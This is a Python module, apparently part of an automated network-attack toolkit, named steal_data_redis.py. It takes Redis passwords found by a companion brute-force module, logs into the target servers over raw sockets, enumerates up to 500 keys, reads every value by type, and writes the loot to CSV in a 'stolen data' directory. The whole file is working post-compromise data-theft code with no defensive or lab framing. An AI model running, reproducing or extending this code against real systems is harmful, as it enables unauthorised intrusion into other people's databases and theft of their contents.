"""
steal_data_redis.py - Dumps keys and values from Redis instances where
authentication has been established by RedisBruteforce.
Uses raw RESP over TCP — no external libraries required.
"""

import os
import socket
import logging
import time
import pandas as pd
from shared import SharedData
from logger import Logger

logger = Logger(name="steal_data_redis.py", level=logging.DEBUG)

b_class = "StealDataRedis"
b_module = "steal_data_redis"
b_status = "steal_data_redis"
b_parent = "RedisBruteforce"
b_port = 6379

MAX_KEYS = 500
MAX_VALUE_BYTES = 65536


class StealDataRedis:
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.b_parent_action = b_parent
        self.stop_execution = False
        logger.info("StealDataRedis initialized.")

    def _connect(self, ip, password, port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(15)
        sock.connect((ip, port))
        if password:
            sock.sendall(f"AUTH {password}\r\n".encode())
            resp = sock.recv(64).decode('utf-8', errors='replace')
            if "+OK" not in resp:
                sock.close()
                return None
        return sock

    def _cmd(self, sock, command, read_bytes=65536):
        sock.sendall((command + "\r\n").encode())
        try:
            sock.settimeout(8)
            buf = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                buf += chunk
                if len(buf) >= read_bytes:
                    break
                decoded = buf.decode('utf-8', errors='replace')
                # Stop reading once we have a complete top-level response
                if decoded.startswith(('+', '-', ':')):
                    if decoded.endswith('\r\n'):
                        break
                elif decoded.startswith('$'):
                    # Bulk string: $<len>\r\n<data>\r\n
                    try:
                        header_end = decoded.index('\r\n')
                        expected_len = int(decoded[1:header_end])
                        if len(buf) >= header_end + 2 + expected_len + 2:
                            break
                    except (ValueError, IndexError):
                        break
                else:
                    # Array or unknown — read until nothing more arrives
                    try:
                        sock.settimeout(1)
                    except Exception:
                        pass
        except socket.timeout:
            pass
        return buf.decode('utf-8', errors='replace').strip()

    def _parse_array(self, resp):
        """Extract string values from a flat RESP array response."""
        values = []
        lines = resp.splitlines()
        i = 0
        while i < len(lines):
            line = lines[i]
            if line.startswith('$'):
                try:
                    length = int(line[1:])
                    i += 1
                    if i < len(lines) and length >= 0:
                        values.append(lines[i])
                except (ValueError, IndexError):
                    pass
            elif line and not line.startswith(('*', '+', '-', ':')):
                values.append(line)
            i += 1
        return values

    def dump_database(self, ip, password, port):
        sock = None
        rows = []
        try:
            sock = self._connect(ip, password, port)
            if not sock:
                return rows

            info_resp = self._cmd(sock, "INFO keyspace")
            logger.info(f"Redis keyspace on {ip}: {info_resp[:300]}")

            # SCAN to collect keys without blocking Redis
            cursor = "0"
            all_keys = []
            iterations = 0
            while len(all_keys) < MAX_KEYS and iterations < 200:
                resp = self._cmd(sock, f"SCAN {cursor} COUNT 100")
                lines = resp.splitlines()
                if len(lines) < 2:
                    break
                # Cursor is the integer value line
                for line in lines:
                    if line.startswith(':') or (line.isdigit()):
                        cursor = line.lstrip(':').strip()
                        break
                    elif line.startswith('$'):
                        continue
                    elif line and not line.startswith('*'):
                        cursor = line.strip()
                        break
                keys_in_page = self._parse_array(resp)
                # First value is the new cursor, rest are keys
                if keys_in_page:
                    cursor = keys_in_page[0]
                    all_keys.extend(keys_in_page[1:])
                if cursor == "0":
                    break
                iterations += 1

            logger.info(f"Collected {len(all_keys)} Redis keys from {ip}")

            for key in all_keys[:MAX_KEYS]:
                if self.shared_data.orchestrator_should_exit or self.stop_execution:
                    break
                try:
                    type_resp = self._cmd(sock, f"TYPE {key}")
                    key_type = type_resp.lstrip('+').strip()

                    if key_type == "string":
                        value = self._cmd(sock, f"GET {key}")
                    elif key_type == "list":
                        value = self._cmd(sock, f"LRANGE {key} 0 99")
                    elif key_type == "hash":
                        value = self._cmd(sock, f"HGETALL {key}")
                    elif key_type == "set":
                        value = self._cmd(sock, f"SMEMBERS {key}")
                    elif key_type == "zset":
                        value = self._cmd(sock, f"ZRANGE {key} 0 99 WITHSCORES")
                    else:
                        value = f"<type:{key_type}>"

                    rows.append({
                        "IP": ip, "Key": key, "Type": key_type,
                        "Value": str(value)[:MAX_VALUE_BYTES]
                    })
                except Exception as e:
                    logger.debug(f"Error fetching key '{key}' from {ip}: {e}")

        except Exception as e:
            logger.error(f"Redis dump error for {ip}: {e}")
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass
        return rows

    def execute(self, ip, port, row, status_key):
        try:
            parent_status = row.get(self.b_parent_action, "")
            if 'success' not in parent_status:
                logger.info(f"Skipping Redis dump for {ip} — parent not successful")
                return 'skipped'

            self.shared_data.ragnarorch_status = "StealDataRedis"
            time.sleep(2)
            logger.info(f"Dumping Redis data from {ip}:{port}...")

            redisfile = self.shared_data.redisfile
            credentials = []
            if os.path.exists(redisfile):
                df = pd.read_csv(redisfile)
                ip_rows = df[df['IP Address'] == ip]
                credentials = ip_rows['Password'].fillna("").tolist()

            if not credentials:
                logger.error(f"No Redis credentials found for {ip}")
                return 'failed'

            mac = row.get('MAC Address', 'unknown')
            local_dir = os.path.join(self.shared_data.datastolendir, f"redis/{mac}_{ip}")
            os.makedirs(local_dir, exist_ok=True)

            for password in credentials:
                if self.stop_execution or self.shared_data.orchestrator_should_exit:
                    break
                password = str(password) if not pd.isna(password) else ""
                rows = self.dump_database(ip, password, port)
                if rows:
                    out_path = os.path.join(local_dir, "redis_dump.csv")
                    pd.DataFrame(rows).to_csv(out_path, index=False)
                    logger.success(f"Redis dump saved: {len(rows)} keys from {ip}")
                    return 'success'

            return 'failed'

        except Exception as e:
            logger.error(f"Unexpected error during Redis dump for {ip}: {e}")
            return 'failed'


if __name__ == "__main__":
    shared_data = SharedData()
    try:
        steal = StealDataRedis(shared_data)
        for row in shared_data.read_data():
            ip = row["IPs"]
            steal.execute(ip, b_port, row, b_status)
    except Exception as e:
        logger.error(f"Error: {e}")
